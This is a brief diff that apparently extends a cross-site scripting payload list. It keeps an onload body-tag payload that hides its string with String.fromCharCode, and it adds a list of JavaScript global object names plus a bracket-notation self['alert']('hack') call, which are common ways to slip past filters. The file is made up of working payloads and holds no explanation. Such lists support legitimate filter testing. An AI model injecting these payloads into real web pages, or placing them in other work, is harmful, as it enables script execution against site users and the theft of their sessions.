@@ -1,1 +1,10 @@
 <body src=x onload="prompt(String.fromCharCode(120,115));">//
+============================================
+window
+self
+_self
+this
+top
+parent
+frames
+self["alert"]("hack")
